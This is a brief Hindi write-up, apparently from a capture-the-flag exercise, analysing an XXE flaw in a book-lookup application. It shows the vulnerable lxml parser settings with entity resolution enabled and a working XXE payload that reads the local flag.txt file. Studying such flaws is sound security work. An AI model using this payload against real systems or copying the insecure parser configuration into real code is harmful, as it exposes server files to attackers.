## विश्लेषण

पुस्तक ID की जाँच करते समय एप्लिकेशन सर्वर को XML-रिक्वेस्ट भेजता है:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<book>
    <id>1</id>
</book>
```

सर्वर इस XML को प्रोसेस करता है और पुस्तक का नाम लौटाता है। यदि हम XML-संरचना को नियंत्रित कर सकते हैं, तो एप्लिकेशन को **XXE (XML External Entity)** भेद्यता के लिए जाँचना चाहिए।


सर्वर कोड (`app.py`) में `lxml` लाइब्रेरी का उपयोग बाहरी सत्ताओं के रिज़ॉल्यूशन की अनुमति देने वाली सेटिंग्स के साथ किया गया है:

```python

parser = etree.XMLParser(resolve_entities=True, no_network=False)
root = etree.fromstring(xml_data, parser=parser)
```

## शोषण

XXE भेद्यता बाहरी सत्ताओं को परिभाषित करने की अनुमति देती है, जिन्हें पार्सर रिज़ॉल्व करने का प्रयास करेगा। हम इसका उपयोग सर्वर पर स्थानीय फ़ाइलें पढ़ने के लिए कर सकते हैं।


`flag.txt` फ़ाइल पढ़ने का प्रयास करते हैं, जो एप्लिकेशन की डायरेक्टरी में है: 


### Payload

रिक्वेस्ट में बदलाव करते हैं, `&xxe;` सत्ता की परिभाषा जोड़ते हैं, जो `flag.txt` फ़ाइल को संदर्भित करती है:


```xml
<!DOCTYPE book [
<!ENTITY xxe SYSTEM "flag.txt">
]>
<book><id>&xxe;</id></book>
```
